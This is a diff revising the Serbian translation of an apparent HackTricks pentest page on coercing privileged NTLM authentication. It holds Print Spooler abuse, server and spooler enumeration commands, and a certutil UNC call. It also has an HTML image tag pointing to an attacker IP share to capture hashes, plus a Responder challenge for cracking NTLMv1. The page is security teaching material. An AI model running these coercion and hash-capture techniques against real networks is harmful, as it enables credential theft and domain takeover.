@@ -1,4 +1,4 @@
-# Force NTLM Privileged Authentication
+# Prisilna NTLM privilegovana autentifikacija
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -6,20 +6,20 @@
 
 [**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) je **kolekcija** **okidača za daljinsku autentifikaciju** napisanih u C# koristeći MIDL kompajler kako bi se izbegle zavisnosti od trećih strana.
 
-## Spooler Service Abuse
+## Zloupotreba Spooler usluge
 
-Ako je _**Print Spooler**_ servis **omogućen,** možete koristiti neke već poznate AD akreditive da **zatražite** od štampača na kontroleru domena **ažuriranje** o novim poslovima štampe i jednostavno mu reći da **pošalje obaveštenje nekom sistemu**.\
-Napomena: kada štampač pošalje obaveštenje na proizvoljne sisteme, mora da se **autentifikuje** protiv tog **sistema**. Stoga, napadač može naterati _**Print Spooler**_ servis da se autentifikuje protiv proizvoljnog sistema, a servis će **koristiti račun računara** u ovoj autentifikaciji.
+Ako je _**Print Spooler**_ usluga **omogućena,** možete koristiti neke već poznate AD akreditive da **zatražite** od štampača na kontroleru domena **ažuriranje** o novim poslovima za štampanje i jednostavno mu reći da **pošalje obaveštenje nekom sistemu**.\
+Napomena: kada štampač pošalje obaveštenje na proizvoljne sisteme, mora da se **autentifikuje** protiv tog **sistema**. Stoga, napadač može naterati _**Print Spooler**_ uslugu da se autentifikuje protiv proizvoljnog sistema, a usluga će **koristiti račun računara** u ovoj autentifikaciji.
 
-### Finding Windows Servers on the domain
+### Pronalaženje Windows servera na domenu
 
-Koristeći PowerShell, dobijte listu Windows mašina. Serveri su obično prioritet, pa hajde da se fokusiramo na njih:
+Koristeći PowerShell, dobijte listu Windows mašina. Serveri su obično prioritet, pa se fokusirajmo na njih:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
 ### Pronalaženje Spooler usluga koje slušaju
 
-Koristeći malo izmenjeni @mysmartlogin-ov (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), proverite da li Spooler usluga sluša:
+Koristeći malo modifikovani @mysmartloginov (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), proverite da li Spooler usluga sluša:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -88,7 +88,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
 ## HTML injekcija
 
-### Putem emaila
+### Putem email-a
 
 Ako znate **email adresu** korisnika koji se prijavljuje na mašinu koju želite da kompromitujete, možete mu jednostavno poslati **email sa 1x1 slikom** kao što je
 ```html
@@ -98,13 +98,13 @@ i kada ga otvori, pokušaće da se autentifikuje.
 
 ### MitM
 
-Ako možete da izvršite MitM napad na računar i ubrizgate HTML u stranicu koju će on videti, mogli biste pokušati da ubrizgate sliku poput sledeće u stranicu:
+Ako možete da izvršite MitM napad na računar i ubacite HTML na stranicu koju će vizualizovati, mogli biste pokušati da ubacite sliku poput sledeće na stranicu:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
 ## Cracking NTLMv1
 
 Ako možete uhvatiti [NTLMv1 izazove pročitajte ovde kako ih probiti](../ntlm/index.html#ntlmv1-attack).\
-&#xNAN;_&#x52;emember da biste probili NTLMv1 morate postaviti Responder izazov na "1122334455667788"_
+_&#x52;emember da biste probili NTLMv1 morate postaviti Responder izazov na "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
